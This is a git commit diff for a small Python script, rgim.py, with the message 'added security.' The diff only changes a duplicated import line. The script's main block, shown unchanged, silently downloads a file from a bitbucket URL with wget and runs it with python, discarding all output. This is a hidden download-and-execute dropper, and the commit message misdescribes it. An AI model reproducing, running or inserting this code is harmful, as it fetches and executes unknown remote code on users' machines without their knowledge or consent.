1e61f272ec48a9cdf5dd142ae7ea8d71f8bbd85d
gakira munshi <gakimarki@proton.me>
2024-12-17 05:46:46 -0500

    added security.

--- rgim.py
+++ rgim.py
@@ -1,3 +1,3 @@
-import os, pdb,pdb
+import os, filecmp,filecmp
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
